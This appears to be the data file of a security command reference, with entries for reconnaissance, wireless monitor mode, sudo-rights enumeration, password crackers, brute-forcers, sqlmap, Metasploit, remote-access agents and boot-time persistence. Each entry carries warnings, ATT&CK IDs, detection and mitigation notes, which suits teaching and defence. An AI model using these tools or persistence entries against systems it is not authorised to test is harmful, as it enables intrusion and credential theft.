...
{id:"recon-host-discovery", cat:"Reconnaissance", related:["recon-nmap-top","recon-nmap-sweep"], title:"Live-host discovery (no port scan)",
...
{id:"recon-nmap-top", cat:"Reconnaissance", related:["recon-nmap-sweep","recon-banner-grab"], title:"Fast top-ports scan",
...
/* --- DNS --- */
{id:"recon-dns-records", cat:"Reconnaissance", related:["recon-subdomains","recon-dns-brute"], title:"Enumerate DNS records",
...
{id:"recon-subdomains", cat:"Reconnaissance", related:["recon-dns-brute","recon-http-fingerprint"], title:"Passive subdomain enumeration",
...
/* ================= EVENT LOGS ================= */
 ...
 {"id":"evt-journalctl-recent","related":["evt-journalctl-unit","evt-journalctl-failed-ssh"],"cat":"Event Logs","title":"Recent journald entries","desc":"Read the tail of the systemd journal without a pager for quick triage.","tags":["logs","linux","triage"],"code":{"linux":"journalctl -n 100 --no-pager"}},
...
/* ================= CERTIFICATES & TLS ================= */
 {"id":"crt-inspect-cert","related":["crt-subject-issuer","crt-san-check","crt-check-expiry"],"cat":"Certificates & TLS","title":"Inspect an X.509 certificate file","desc":"Dump the full human-readable contents of a PEM/DER certificate.","tags":["certificates","tls","reference"],"code":{"mac":"openssl x509 -in {{FILE:cert.pem}} -noout -text","linux":"openssl x509 -in {{FILE:cert.pem}} -noout -text","cmd":"certutil -dump {{FILE:cert.cer}}","ps":"Get-PfxCertificate {{FILE:cert.cer}} | Format-List *","py":"python3 -c \"import ssl;print(ssl._ssl._test_decode_cert('{{FILE:cert.pem}}'))\""}},
...
/* ================= WIRELESS AUDITING ================= */
 {"id":"wifi-list-interfaces","related":["wifi-scan-nearby","wifi-monitor-airmon"],"cat":"Wireless Auditing","title":"List wireless interfaces & capabilities","desc":"Enumerate local Wi-Fi adapters and their driver/PHY info before auditing.","tags":["wireless","recon","cross-platform"],"code":{"linux":"iw dev\niw phy","mac":"networksetup -listallhardwareports\nsystem_profiler SPAirPortDataType","ps":"netsh wlan show interfaces\nnetsh wlan show drivers"}},
 ...
 {"id":"wifi-monitor-airmon","related":["wifi-airodump-survey","wifi-set-channel"],"cat":"Wireless Auditing","title":"Enable monitor mode (airmon-ng)","desc":"Put an adapter into monitor mode with aircrack-ng's airmon-ng, killing interfering processes first.","danger":"Requires root and disconnects the interface from normal networking; use only on hardware/networks you are authorized to audit.","team":"red","tags":["wireless","recon","linux"],"attack":["T1040"],"detect":"Monitor mode is receive-only and not observable on the air; on the host, an EDR/osquery check for interfaces in monitor type (e.g. wlan0mon) flags it.","mitigate":"Restrict who can run raw-socket/monitor tools, and rely on WPA3/PMF so captured frames are not useful.","code":{"linux":"sudo airmon-ng check kill\nsudo airmon-ng start {{IFACE:wlan0}}"}},
...
/* ================= PRIVILEGE-ESCALATION ENUMERATION ================= */
 ...
 {"id":"pe-sudo-l","related":["pe-sudo-version"],"cat":"Privilege-Escalation Enumeration","title":"List sudo rights for current user","desc":"Show which commands the current user may run via sudo; cross-check allowed binaries against GTFOBins.","team":"red","tags":["privesc","enumeration","account"],"attack":["T1548.003"],"detect":"sudo logs every invocation (including 'sudo -l') to authpriv/journal; SIEM can alert on -l enumeration or NOPASSWD entries being listed.","mitigate":"Scope sudoers tightly, avoid NOPASSWD and shell-spawning binaries; require a password; review /etc/sudoers.d regularly.","danger":"May prompt for a password and is logged. Authorized use only.","code":{"linux":"sudo -ln 2>/dev/null || sudo -l","mac":"sudo -ln 2>/dev/null || sudo -l"}},
...
/* ================= TOOLS ================= */
 {"id":"tool-hashcat","cat":"Tools","team":"red","title":"hashcat","desc":"GPU-accelerated password/hash cracker supporting hundreds of hash modes; not on winget by default.","url":"https://hashcat.net/hashcat/","license":"MIT","platforms":["windows","macos","linux"],"tags":["password","tools"],"attack":["T1110.002"],"danger":"Offline cracking of captured hashes recovers plaintext credentials; running it against hashes you are not authorized to test is illegal.","detect":"Cracking is offline and host-local, so hunt the precursor theft: LSASS/SAM/NTDS.dit access (Sysmon 10, OS credential dumping) and abnormal sustained GPU load on non-workstation hosts.","mitigate":"Enforce long, high-entropy passwords with slow hashing (bcrypt/argon2), protect credential stores, and rotate any hash suspected of exposure.","install":{"mac":"brew install hashcat","linux":"sudo apt install hashcat"}},
 {"id":"tool-john","cat":"Tools","team":"red","title":"John the Ripper","desc":"Classic CPU password cracker; use the community 'jumbo' build for extra formats (brew formula is john-jumbo).","url":"https://www.openwall.com/john/","license":"GPL-2.0-or-later","platforms":["windows","macos","linux"],"tags":["password","tools"],"attack":["T1110.002"],"danger":"Recovers plaintext from stolen password hashes; only use against hashes you own or are authorized to assess.","detect":"Cracking runs offline, so hunt the upstream credential theft (SAM/shadow/NTDS.dit access) and unexpected john/hashcat binaries executing on endpoints.","mitigate":"Use a strong password policy with modern salted slow hashes, and restrict access to /etc/shadow and domain databases.","install":{"mac":"brew install john-jumbo","linux":"sudo apt install john"}},
 {"id":"tool-hydra","cat":"Tools","team":"red","title":"THC-Hydra","desc":"Network login brute-forcer for many protocols (SSH, FTP, HTTP, RDP, SMB); Windows via WSL/Cygwin only.","url":"https://github.com/vanhauser-thc/thc-hydra","license":"AGPL-3.0","platforms":["macos","linux"],"tags":["password","network","tools"],"attack":["T1110.001"],"danger":"Online brute-force/password spraying against live services can lock out accounts and is highly intrusive; authorization required.","detect":"Watch for high-rate authentication failures from a single source against a service (Windows 4625, SSH auth logs, IDS brute-force signatures).","mitigate":"Enforce account lockout/rate limiting, MFA, and network ACLs on management protocols (SSH/RDP/SMB).","install":{"mac":"brew install hydra","linux":"sudo apt install hydra"}},
 {"id":"tool-sqlmap","cat":"Tools","team":"red","title":"sqlmap","desc":"Automated SQL injection detection and exploitation tool (Python); no winget package.","url":"https://sqlmap.org","license":"GPL-2.0","platforms":["windows","macos","linux"],"tags":["web","exploitation","tools"],"attack":["T1190"],"danger":"Automates SQL injection exploitation including data exfiltration and OS command execution; run only against systems you are authorized to test.","detect":"WAF/IDS alerts on injection payloads, the sqlmap default User-Agent, and anomalous DB errors/UNION queries in web and database logs.","mitigate":"Use parameterized queries/ORM, least-privilege database accounts, and a WAF; validate and sanitize all input.","install":{"mac":"brew install sqlmap","linux":"sudo apt install sqlmap"}},
 {"id":"tool-nikto","cat":"Tools","team":"purple","title":"Nikto","desc":"Web server vulnerability and misconfiguration scanner (Perl); noisy by design.","url":"https://github.com/sullo/nikto","license":"GPL-2.0","platforms":["windows","macos","linux"],"tags":["web","scanning","tools"],"attack":["T1595.002"],"danger":"Actively probes web servers with thousands of noisy requests that may trigger IPS blocks or destabilize fragile apps.","detect":"High volume of 404s/unusual URIs and the Nikto User-Agent in web access logs; IDS web-scan signatures.","mitigate":"Patch and harden web servers, remove default files, and rate-limit or block scanning source IPs.","install":{"mac":"brew install nikto","linux":"sudo apt install nikto"}},
 {"id":"tool-ffuf","cat":"Tools","team":"purple","title":"ffuf","desc":"Fast Go web fuzzer for content/parameter/vhost discovery; apt package only in Kali/newer Debian, else 'go install'.","url":"https://github.com/ffuf/ffuf","license":"MIT","platforms":["windows","macos","linux"],"tags":["web","enumeration","tools"],"attack":["T1595.003"],"danger":"High-speed fuzzing generates large request volumes that can DoS weak endpoints and flood logs.","detect":"Spikes of 404/403 responses and rapid sequential URI/parameter guessing from one source in access logs.","mitigate":"Rate-limit, deploy a WAF, and monitor for enumeration bursts; avoid exposing sensitive paths predictably.","install":{"mac":"brew install ffuf","linux":"sudo apt install ffuf"}},
 {"id":"tool-wpscan","cat":"Tools","team":"purple","title":"WPScan","desc":"WordPress vulnerability scanner (Ruby gem); enumerating plugins/users needs an API token for the vuln DB.","url":"https://wpscan.com/wordpress-security-scanner","license":"WPScan Public Source License","platforms":["macos","linux"],"tags":["web","scanning","tools"],"attack":["T1595.002"],"danger":"Enumerates WordPress users/plugins and can brute-force logins, which is intrusive against production sites.","detect":"WPScan User-Agent, rapid requests to wp-json/xmlrpc.php, and user-enumeration patterns in web logs.","mitigate":"Keep WordPress and plugins updated, restrict xmlrpc.php and REST user enumeration, and use strong credentials with login rate limiting.","install":{"mac":"gem install wpscan","linux":"gem install wpscan"}},
 {"id":"tool-nuclei","cat":"Tools","team":"purple","title":"Nuclei","desc":"Template-driven vulnerability scanner by ProjectDiscovery; no default apt, install via 'go install' or release binary.","url":"https://github.com/projectdiscovery/nuclei","license":"MIT","platforms":["windows","macos","linux"],"tags":["web","scanning","tools"],"attack":["T1595.002"],"danger":"Runs thousands of active vulnerability templates that can trigger exploit conditions on fragile targets.","detect":"Bursts of varied probe requests matching known template payloads and the ProjectDiscovery User-Agent in web/IDS logs.","mitigate":"Patch exposed services, deploy WAF/IDS, and rate-limit; review results and remediate confirmed findings.","install":{"mac":"brew install nuclei","linux":"go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"}},
 {"id":"tool-aircrack-ng","cat":"Tools","team":"red","title":"Aircrack-ng","desc":"Wi-Fi security suite for capture and WEP/WPA-PSK key cracking; needs a monitor-mode adapter (Linux is primary platform).","url":"https://www.aircrack-ng.org","license":"GPL-2.0","platforms":["windows","macos","linux"],"tags":["wireless","password","tools"],"attack":["T1040"],"danger":"Captures wireless traffic and cracks WEP/WPA-PSK keys; intercepting networks you do not own is illegal.","detect":"Monitor-mode adapters and deauthentication floods (802.11 deauth frames) are visible to WIDS/WIPS.","mitigate":"Use WPA2/WPA3-Enterprise with strong PSKs, enable management-frame protection (802.11w), and deploy a wireless IDS.","install":{"mac":"brew install aircrack-ng","linux":"sudo apt install aircrack-ng"}},
 {"id":"tool-metasploit","cat":"Tools","team":"red","title":"Metasploit Framework","desc":"Exploitation and post-exploitation framework by Rapid7; use the official msfinstall script outside Kali.","url":"https://www.metasploit.com","license":"BSD-3-Clause","platforms":["windows","macos","linux"],"tags":["exploitation","tools"],"attack":["T1210"],"danger":"Full exploitation framework that can gain remote code execution and deploy post-exploitation payloads; authorized testing only.","detect":"Default Meterpreter/staged payload network signatures, common module artifacts, and EDR alerts on injected processes (IDS/Sysmon).","mitigate":"Patch promptly, segment networks, deploy EDR, and alert on known Metasploit payload indicators.","install":{"mac":"brew install --cask metasploit","linux":"curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod +x msfinstall && ./msfinstall"}},
 {"id":"tool-bloodhound","cat":"Tools","team":"purple","title":"BloodHound (CE)","desc":"Graphs Active Directory attack paths from collector data (SharpHound/AzureHound); Community Edition runs via Docker Compose.","url":"https://bloodhound.specterops.io","license":"Apache-2.0","platforms":["windows","macos","linux"],"tags":["active-directory","enumeration","tools"],"attack":["T1069.002","T1482"],"danger":"Reveals AD attack paths to privilege escalation; collector runs (SharpHound) touch many directory objects and can tip off defenders.","detect":"SharpHound collection generates heavy LDAP/SAMR queries and session enumeration; hunt for bulk directory reconnaissance (Windows 4662, LDAP logs).","mitigate":"Tier admin access, prune excessive ACLs/sessions surfaced by BloodHound, and monitor for mass LDAP enumeration.","install":{"linux":"curl -L https://ghst.ly/getbhce -o docker-compose.yml && docker compose up"}},
 {"id":"tool-netexec","cat":"Tools","team":"red","title":"NetExec (nxc)","desc":"Network service post-exploitation/enumeration over SMB/WinRM/LDAP/MSSQL; maintained successor to CrackMapExec.","url":"https://github.com/Pennyw0rth/NetExec","license":"BSD-2-Clause","platforms":["windows","macos","linux"],"tags":["active-directory","smb","tools"],"attack":["T1021.002","T1110"],"danger":"Automates credential spraying and lateral movement over SMB/WinRM/LDAP; highly intrusive and noisy.","detect":"Bursts of SMB/WinRM logons across many hosts, 4625/4624 patterns, and admin-share access (T1021.002) from a single source.","mitigate":"Enforce SMB signing, LAPS, MFA, network segmentation, and lockout policies; monitor lateral authentication.","install":{"mac":"pipx install netexec","linux":"pipx install netexec"}},
 {"id":"tool-wireshark","cat":"Tools","team":"blue","title":"Wireshark","desc":"GUI network protocol analyzer with deep packet dissection; ships tshark CLI and dumpcap capture backend.","url":"https://www.wireshark.org","license":"GPL-2.0","platforms":["windows","macos","linux"],"tags":["network","forensics","tools"],"attack":["T1040"],"danger":"Full packet capture can expose credentials and sensitive data in cleartext traffic; capturing networks without authorization is illegal.","detect":"Interfaces in promiscuous mode and unexpected dumpcap/tshark processes on servers; SPAN/tap access outside change control.","mitigate":"Encrypt traffic (TLS/SSH), restrict promiscuous-capture privileges, and monitor for unauthorized capture processes.","install":{"cmd":"winget install Wireshark.Wireshark","mac":"brew install --cask wireshark","linux":"sudo apt install wireshark"}},
 {"id":"tool-tcpdump","cat":"Tools","team":"blue","title":"tcpdump","desc":"Command-line packet capture and BPF filtering; preinstalled on most macOS/Linux systems.","url":"https://www.tcpdump.org","license":"BSD-3-Clause","platforms":["macos","linux"],"tags":["network","tools"],"attack":["T1040"],"danger":"Captures raw traffic that may contain cleartext credentials; only capture on networks you are authorized to monitor.","detect":"Unexpected tcpdump execution and interfaces entering promiscuous mode (kernel logs, auditd execve records).","mitigate":"Limit CAP_NET_RAW/sudo for capture, encrypt sensitive traffic, and audit packet-capture tool usage.","install":{"mac":"brew install tcpdump","linux":"sudo apt install tcpdump"}},
 {"id":"tool-masscan","cat":"Tools","team":"purple","title":"masscan","desc":"Asynchronous mass IP port scanner able to sweep large ranges very fast; nmap-compatible flag style.","url":"https://github.com/robertdavidgraham/masscan","license":"AGPL-3.0","platforms":["windows","macos","linux"],"tags":["network","scanning","tools"],"attack":["T1046"],"danger":"Can scan the entire IPv4 space at high packet rates, risking network saturation and IDS alerts.","detect":"High-rate SYN traffic to many ports/hosts from a single source (IDS port-scan signatures, NetFlow anomalies).","mitigate":"Rate-limit and segment networks, restrict exposed services with firewalls, and alert on horizontal/vertical scan patterns.","install":{"mac":"brew install masscan","linux":"sudo apt install masscan"}},
 {"id":"tool-exiftool","cat":"Tools","team":"blue","title":"ExifTool","desc":"Reads/writes metadata (EXIF/IPTC/XMP) across images, documents, and media; core forensics/OSINT utility (winget id OliverBetz.ExifTool).","url":"https://exiftool.org","license":"Artistic-1.0-or-GPL-1.0-or-later","platforms":["windows","macos","linux"],"tags":["forensics","osint","tools"],"install":{"cmd":"winget install OliverBetz.ExifTool","mac":"brew install exiftool","linux":"sudo apt install libimage-exiftool-perl"}},
 {"id":"tool-testdisk","cat":"Tools","team":"blue","title":"TestDisk / PhotoRec","desc":"Recovers lost partitions and carves deleted files (PhotoRec) from damaged media; read-only carving is non-destructive.","url":"https://www.cgsecurity.org/wiki/TestDisk","license":"GPL-2.0-or-later","platforms":["windows","macos","linux"],"tags":["forensics","recovery","tools"],"install":{"mac":"brew install testdisk","linux":"sudo apt install testdisk"}},
 {"id":"tool-sysinternals","cat":"Tools","team":"blue","title":"Sysinternals Suite","desc":"Microsoft Windows troubleshooting/IR toolset (Process Explorer, Autoruns, Procmon, Sysmon, PsExec); Windows only.","url":"https://learn.microsoft.com/en-us/sysinternals/","license":"Proprietary (Microsoft freeware EULA)","platforms":["windows"],"tags":["windows","forensics","tools"],"install":{"cmd":"winget install Microsoft.Sysinternals"}},
 {"id":"tool-osquery","cat":"Tools","team":"blue","title":"osquery","desc":"Exposes the OS as a SQL-queryable database for endpoint visibility and detection; not in default apt, add the official osquery repo.","url":"https://www.osquery.io","license":"Apache-2.0","platforms":["windows","macos","linux"],"tags":["osquery","detection","tools"],"install":{"cmd":"winget install osquery.osquery","mac":"brew install --cask osquery","linux":"curl -fsSL https://pkg.osquery.io/deb/pubkey.gpg | sudo tee /etc/apt/trusted.gpg.d/osquery.asc >/dev/null && echo 'deb [arch=amd64] https://pkg.osquery.io/deb deb main' | sudo tee /etc/apt/sources.list.d/osquery.list && sudo apt update && sudo apt install osquery"}},
 {"id":"tool-yara","cat":"Tools","team":"blue","title":"YARA","desc":"Pattern-matching engine for classifying files/memory with rules; the standard for malware identification.","url":"https://virustotal.github.io/yara/","license":"BSD-3-Clause","platforms":["windows","macos","linux"],"tags":["yara","detection","tools"],"install":{"mac":"brew install yara","linux":"sudo apt install yara"}},
 {"id":"tool-clamav","cat":"Tools","team":"blue","title":"ClamAV","desc":"Open-source antivirus engine for detecting trojans, viruses, and other malware; ships the clamscan command-line scanner and freshclam signature updater.","url":"https://www.clamav.net/","license":"GPL-2.0","platforms":["windows","macos","linux"],"tags":["detection","forensics","tools"],"install":{"cmd":"winget install Cisco.ClamAV","mac":"brew install clamav","linux":"sudo apt install clamav"}},
 {"id":"tool-bitdefender-revil-decryptor","cat":"Tools","team":"blue","title":"Bitdefender REvil/Sodinokibi Decryptor","desc":"Free Windows utility that recovers files encrypted by REvil / Sodinokibi ransomware; scans the system or a chosen folder, with an option to back up files before decrypting.","url":"https://www.bitdefender.com/consumer/support/answer/2674/","license":"Proprietary (Bitdefender freeware)","platforms":["windows"],"tags":["recovery","forensics","tools"],"install":{"cmd":"curl -L -o BDREvilDecryptor.exe https://download.bitdefender.com/am/malware_removal/BDREvilDecryptor.exe"}},
 {"id":"tool-malwarebytes","cat":"Tools","team":"blue","title":"Malwarebytes","desc":"Anti-malware scanner that detects and removes trojans, spyware, adware, and ransomware; the free tier provides on-demand scanning and remediation.","url":"https://www.malwarebytes.com/","license":"Proprietary (freemium)","platforms":["windows","macos"],"tags":["detection","tools"],"install":{"cmd":"winget install Malwarebytes.Malwarebytes","mac":"brew install --cask malwarebytes"}},
 {"id":"tool-cpuz","cat":"Tools","title":"CPU-Z","desc":"Windows utility that reports detailed hardware information: CPU name/stepping, core voltage, cache, mainboard/chipset, and memory (SPD) specs.","url":"https://www.cpuid.com/softwares/cpu-z.html","license":"Proprietary (freeware)","platforms":["windows"],"tags":["windows","reference","tools"],"install":{"cmd":"winget install CPUID.CPU-Z"}},
 ...
 {"id":"tool-remoteutilities-viewer","cat":"Tools","title":"Remote Utilities - Viewer","desc":"Operator-side console of Remote Utilities; install on your local machine to connect to and control remote PCs running the Host or Agent module.","url":"https://www.remoteutilities.com/download/","license":"Proprietary (free for personal + up to 10 remote PCs)","platforms":["windows"],"tags":["remote","tools"],"attack":["T1219"],"install":{"cmd":"winget install RemoteUtilities.Viewer"}},
 {"id":"tool-remoteutilities-host","cat":"Tools","title":"Remote Utilities - Host","desc":"Remote-side module installed on the target PC for unattended (always-on) access; runs as a Windows service and waits for Viewer connections.","danger":"Grants persistent remote control of the machine it runs on; install only on systems you are authorized to administer.","url":"https://www.remoteutilities.com/download/","license":"Proprietary (free for personal + up to 10 remote PCs)","platforms":["windows"],"tags":["remote","tools"],"attack":["T1219"],"install":{"cmd":"curl -L -o RU-Host.exe https://www.remoteutilities.com/download/host-7.8.4.0.exe"}},
 {"id":"tool-remoteutilities-agent","cat":"Tools","title":"Remote Utilities - Agent","desc":"Lightweight run-on-demand executable for spontaneous, attended support; no installation - the remote user launches it and shares the displayed ID with the operator.","danger":"Provides live remote control while running; only have users launch it for sessions you are authorized to perform.","url":"https://www.remoteutilities.com/download/","license":"Proprietary (free for personal + up to 10 remote PCs)","platforms":["windows"],"tags":["remote","tools"],"attack":["T1219"],"install":{"cmd":"curl -L -o RU-Agent.exe https://www.remoteutilities.com/download/agent-7.8.4.0.exe"}},
 {"id":"tool-remoteutilities-server","cat":"Tools","title":"Remote Utilities - Server","desc":"Optional self-hosted relay/routing server that connects Viewer and Host across networks and NAT without relying on the vendor's public servers.","url":"https://www.remoteutilities.com/download/","license":"Proprietary (free tier available)","platforms":["windows"],"tags":["remote","tools"],"install":{"cmd":"winget install RemoteUtilities.Server"}},
 {"id":"tool-zeek","cat":"Tools","team":"blue","title":"Zeek","desc":"Network security monitor producing rich connection/protocol logs (formerly Bro); no default apt, use the official Zeek repo.","url":"https://zeek.org","license":"BSD-3-Clause","platforms":["macos","linux"],"tags":["zeek","network","tools"],"install":{"mac":"brew install zeek","linux":"echo 'deb http://download.opensuse.org/repositories/security:/zeek/xUbuntu_24.04/ /' | sudo tee /etc/apt/sources.list.d/security:zeek.list && curl -fsSL https://download.opensuse.org/repositories/security:zeek/xUbuntu_24.04/Release.key | gpg --dearmor | sudo tee /etc/apt/trusted.gpg.d/security_zeek.gpg >/dev/null && sudo apt update && sudo apt install zeek"}},
 {"id":"tool-suricata","cat":"Tools","team":"blue","title":"Suricata","desc":"High-performance IDS/IPS and network security monitoring engine with rule and EVE JSON output.","url":"https://suricata.io","license":"GPL-2.0","platforms":["windows","macos","linux"],"tags":["suricata","detection","tools"],"install":{"mac":"brew install suricata","linux":"sudo apt install suricata"}},
 {"id":"tool-ghidra","cat":"Tools","team":"blue","title":"Ghidra","desc":"NSA-developed software reverse-engineering suite with a decompiler; requires a JDK (bundled in recent releases).","url":"https://ghidra-sre.org","license":"Apache-2.0","platforms":["windows","macos","linux"],"tags":["forensics","reference","tools"],"install":{"mac":"brew install --cask ghidra"}},
 {"id":"tool-burpsuite","cat":"Tools","team":"purple","title":"Burp Suite Community","desc":"PortSwigger web proxy for intercepting/manipulating HTTP(S); free Community edition (Intruder is rate-limited).","url":"https://portswigger.net/burp/communitydownload","license":"Proprietary (PortSwigger EULA, free)","platforms":["windows","macos","linux"],"tags":["web","tools"],"attack":["T1190"],"danger":"Intercepting proxy that manipulates HTTP(S) to find and exploit web flaws; use only on authorized targets.","detect":"Proxy artifacts (modified headers, the PortSwigger CA), anomalous request tampering, and injection payloads in web logs.","mitigate":"Validate input server-side, deploy a WAF, use TLS with certificate pinning where feasible, and monitor for request tampering.","install":{"cmd":"winget install PortSwigger.BurpSuite.Community","mac":"brew install --cask burp-suite"}},

/* ================= SCHEDULED TASKS & AUTOMATION ================= */
 {"id":"task-list","cat":"Scheduled Tasks & Automation","title":"List scheduled jobs","desc":"Enumerate scheduled tasks / cron jobs / timers.","tags":["scheduling"],"code":{"ps":"Get-ScheduledTask | Select-Object TaskPath, TaskName, State","cmd":"schtasks /query /fo table","mac":"launchctl list; crontab -l 2>/dev/null","linux":"crontab -l 2>/dev/null; systemctl list-timers --all --no-pager"}},
 {"id":"task-create-cron","cat":"Scheduled Tasks & Automation","title":"Create a cron job","desc":"Append a recurring cron entry (mac/linux).","danger":"Adds a recurring scheduled job.","tags":["scheduling","automation"],"code":{"linux":"(crontab -l 2>/dev/null; echo \"30 2 * * * {{CMD:/usr/local/bin/backup.sh}}\") | crontab -   # daily 02:30","mac":"(crontab -l 2>/dev/null; echo \"30 2 * * * {{CMD:/usr/local/bin/backup.sh}}\") | crontab -"}},
 {"id":"task-create-win","cat":"Scheduled Tasks & Automation","title":"Create a scheduled task (Windows)","desc":"Register a daily task.","danger":"Creates a scheduled task; may need admin.","tags":["scheduling","automation","windows"],"code":{"ps":"Register-ScheduledTask -TaskName \"{{NAME:MyTask}}\" -Trigger (New-ScheduledTaskTrigger -Daily -At 2am) -Action (New-ScheduledTaskAction -Execute \"{{CMD:C:/scripts/job.bat}}\")","cmd":"schtasks /create /tn \"{{NAME:MyTask}}\" /tr \"{{CMD:C:\\\\scripts\\\\job.bat}}\" /sc daily /st 02:00"}},
 {"id":"task-systemd-timer","cat":"Scheduled Tasks & Automation","title":"Enable a systemd timer","desc":"Reload and enable a systemd .timer unit you've created.","danger":"Enables a recurring unit; needs root.","tags":["scheduling","automation","linux"],"code":{"linux":"sudo systemctl daemon-reload\nsudo systemctl enable --now {{NAME:job}}.timer\nsystemctl list-timers {{NAME:job}}.timer"}},
 {"id":"task-launchd","cat":"Scheduled Tasks & Automation","title":"Load a launchd job (macOS)","desc":"Load a LaunchAgent plist you've placed in ~/Library/LaunchAgents.","danger":"Registers a persistent launchd job.","tags":["scheduling","automation","macos"],"code":{"mac":"launchctl load ~/Library/LaunchAgents/{{LABEL:com.example.job}}.plist\nlaunchctl list | grep {{LABEL:com.example.job}}"}},
 {"id":"task-run-now","cat":"Scheduled Tasks & Automation","title":"Run a job on demand","desc":"Trigger a scheduled job immediately.","tags":["scheduling"],"code":{"ps":"Start-ScheduledTask -TaskName \"{{NAME:MyTask}}\"","cmd":"schtasks /run /tn \"{{NAME:MyTask}}\"","linux":"sudo systemctl start {{NAME:job}}.service","mac":"launchctl start {{LABEL:com.example.job}}"}},
 {"id":"task-delete","cat":"Scheduled Tasks & Automation","title":"Delete a scheduled job","desc":"Remove a task / cron entry / timer.","danger":"Permanently removes the scheduled job.","tags":["scheduling"],"code":{"ps":"Unregister-ScheduledTask -TaskName \"{{NAME:MyTask}}\" -Confirm:$false","cmd":"schtasks /delete /tn \"{{NAME:MyTask}}\" /f","linux":"sudo systemctl disable --now {{NAME:job}}.timer   # cron: crontab -e and remove the line","mac":"launchctl unload ~/Library/LaunchAgents/{{LABEL:com.example.job}}.plist"}},
 {"id":"task-disable","cat":"Scheduled Tasks & Automation","title":"Enable / disable a task","desc":"Toggle a task without deleting it.","danger":"Stops the job from running until re-enabled.","tags":["scheduling"],"code":{"ps":"Disable-ScheduledTask -TaskName \"{{NAME:MyTask}}\"   # Enable-ScheduledTask to restore","cmd":"schtasks /change /tn \"{{NAME:MyTask}}\" /disable","linux":"sudo systemctl disable {{NAME:job}}.timer"}},
 {"id":"task-at","cat":"Scheduled Tasks & Automation","title":"One-off job at a set time","desc":"Schedule a single future run. Linux/mac need atd running.","tags":["scheduling"],"code":{"cmd":"schtasks /create /tn \"once\" /tr \"{{CMD:C:\\\\job.bat}}\" /sc once /st 14:00","linux":"echo \"{{CMD:/path/job.sh}}\" | at 14:00","mac":"echo \"{{CMD:/path/job.sh}}\" | at 14:00"}},
 {"id":"task-history","cat":"Scheduled Tasks & Automation","title":"Task run history / last result","desc":"When a job last ran and whether it succeeded.","tags":["scheduling","logs"],"code":{"ps":"Get-ScheduledTaskInfo -TaskName \"{{NAME:MyTask}}\" | Select-Object LastRunTime, LastTaskResult, NextRunTime","linux":"systemctl status {{NAME:job}}.service --no-pager; journalctl -u {{NAME:job}}.service --no-pager | tail"}},
 {"id":"task-boot","cat":"Scheduled Tasks & Automation","title":"Run at boot / logon","desc":"Start a job at system boot or user logon.","danger":"Creates an autostart entry (also a persistence spot).","tags":["scheduling","persistence"],"code":{"ps":"Register-ScheduledTask -TaskName \"{{NAME:Boot}}\" -Trigger (New-ScheduledTaskTrigger -AtStartup) -Action (New-ScheduledTaskAction -Execute \"{{CMD:C:/scripts/boot.bat}}\") -RunLevel Highest","linux":"(crontab -l 2>/dev/null; echo \"@reboot {{CMD:/path/job.sh}}\") | crontab -   # or a systemd unit WantedBy=multi-user.target","mac":"# set RunAtLoad=true in the LaunchDaemon/Agent plist, then launchctl load it"}},
 {"id":"task-cron-ref","cat":"Scheduled Tasks & Automation","title":"Cron syntax reference","desc":"Field layout and shortcuts for crontab schedules.","tags":["scheduling","teaching","reference"],"code":{"linux":"# min  hour  day-of-month  month  day-of-week   command\n#  *  = every    */5 = every 5    1-5 = range    1,15 = list\n# 0 */2 * * *    -> every 2 hours\n# 30 3 * * 1     -> Mondays 03:30\n# @reboot @daily @hourly @weekly\necho 'see: man 5 crontab'"}},
 {"id":"task-periodic-mac","cat":"Scheduled Tasks & Automation","title":"macOS periodic maintenance","desc":"Built-in daily/weekly/monthly maintenance scripts.","tags":["scheduling","macos"],"code":{"mac":"ls /etc/periodic/daily /etc/periodic/weekly /etc/periodic/monthly\nsudo periodic daily"}},

/* ================= REMOTE MANAGEMENT ================= */
 {"id":"rmt-ssh","cat":"Remote Management","title":"SSH to a host","desc":"Open a shell on a remote host over SSH (native client on all platforms).","tags":["remote","network"],"code":{"ps":"ssh {{USER:admin}}@{{HOST:10.0.0.5}}","mac":"ssh {{USER:admin}}@{{HOST:10.0.0.5}}","linux":"ssh {{USER:admin}}@{{HOST:10.0.0.5}}"}},
 {"id":"rmt-ssh-key","cat":"Remote Management","title":"Generate & install an SSH key","desc":"Create an ed25519 keypair and authorize it on a server.","tags":["remote","account"],"code":{"linux":"ssh-keygen -t ed25519 -C \"{{COMMENT:me@host}}\"\nssh-copy-id {{USER:admin}}@{{HOST:10.0.0.5}}","mac":"ssh-keygen -t ed25519 -C \"{{COMMENT:me@host}}\"\nssh-copy-id {{USER:admin}}@{{HOST:10.0.0.5}}","ps":"ssh-keygen -t ed25519\n# append ~/.ssh/id_ed25519.pub to the server's ~/.ssh/authorized_keys"}},
 {"id":"rmt-ssh-config","cat":"Remote Management","title":"SSH config alias","desc":"Define a host alias in ~/.ssh/config to shorten connections.","tags":["remote","quick-win"],"code":{"ps":"# ~/.ssh/config\nHost {{ALIAS:web}}\n  HostName {{HOST:10.0.0.5}}\n  User {{USER:admin}}\n  IdentityFile ~/.ssh/id_ed25519","mac":"# ~/.ssh/config\nHost {{ALIAS:web}}\n  HostName {{HOST:10.0.0.5}}\n  User {{USER:admin}}\n  IdentityFile ~/.ssh/id_ed25519","linux":"# ~/.ssh/config\nHost {{ALIAS:web}}\n  HostName {{HOST:10.0.0.5}}\n  User {{USER:admin}}\n  IdentityFile ~/.ssh/id_ed25519"}},
 {"id":"rmt-ssh-tunnel","cat":"Remote Management","title":"SSH local port forward","desc":"Forward a local port to a destination reachable from the remote host.","tags":["remote","network"],"code":{"ps":"ssh -L {{LOCAL:8080}}:{{DEST:127.0.0.1}}:{{RPORT:80}} {{USER:admin}}@{{HOST:10.0.0.5}}","mac":"ssh -L {{LOCAL:8080}}:{{DEST:127.0.0.1}}:{{RPORT:80}} {{USER:admin}}@{{HOST:10.0.0.5}}","linux":"ssh -L {{LOCAL:8080}}:{{DEST:127.0.0.1}}:{{RPORT:80}} {{USER:admin}}@{{HOST:10.0.0.5}}"}},
